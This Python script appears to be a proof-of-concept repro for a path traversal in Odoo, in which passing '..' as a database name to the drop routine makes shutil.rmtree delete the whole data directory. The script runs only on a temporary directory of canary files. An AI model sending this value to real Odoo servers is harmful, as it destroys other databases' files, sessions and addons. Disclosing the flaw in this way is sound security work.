#!/usr/bin/env python3
"""Deterministic repro of the Odoo filestore path traversal (CWE-22) — no install needed.

Replicates verbatim:
  config.py:813-814   filestore(dbname) = os.path.join(data_dir, 'filestore', dbname)
  service/db.py:257-259  exp_drop(): fs = filestore(name); if exists: shutil.rmtree(fs)
  service/db.py:525-537  dispatch(): check_super(params[0])   <-- the only gate

Proves that a DB name like '..' makes filestore() resolve to the data dir itself,
so shutil.rmtree empties every database's filestore, all sessions and addons.

Usage: python3 repro_traversal.py
"""
import os
import shutil
import tempfile


def filestore(data_dir, dbname):
    return os.path.join(data_dir, "filestore", dbname)


def exp_drop(data_dir, db_name):
    fs = filestore(data_dir, db_name)
    if os.path.exists(fs):
        shutil.rmtree(fs)          # may raise on the final unlink of 'filestore/..'
        return True, fs
    return False, fs


def main():
    d = tempfile.mkdtemp(prefix="odoo_data_")
    os.makedirs(os.path.join(d, "filestore", "prod_db"))
    os.makedirs(os.path.join(d, "sessions"))
    os.makedirs(os.path.join(d, "addons", "custom_module"))
    for p in ("canary.txt", "sessions/s.txt",
              "filestore/prod_db/attachment.bin", "addons/custom_module/__init__.py"):
        open(os.path.join(d, p), "w").write("CANARY\n")

    print("data_dir:", d)
    print("before:", sorted(os.path.relpath(os.path.join(r, f), d)
                            for r, _, fs in os.walk(d) for f in fs))

    fs = filestore(d, "..")
    print("\nfilestore(d,'..')      ->", fs)
    print("os.path.normpath       ->", os.path.normpath(fs))
    print("== data_dir ?          ", os.path.normpath(fs) == d)

    try:
        print("exp_drop(d,'..') ->", exp_drop(d, ".."))
    except Exception as e:                     # expected on POSIX/3.12
        print("exp_drop(d,'..') raised:", type(e).__name__, e)
        print("  (raised on the FINAL unlink of 'filestore/..' AFTER the walk already")
        print("   deleted every child — Odoo's route catches it and shows an error page)")

    print("after : data_dir exists =", os.path.exists(d), "| contents =", os.listdir(d))
    shutil.rmtree(d, ignore_errors=True)


if __name__ == "__main__":
    main()
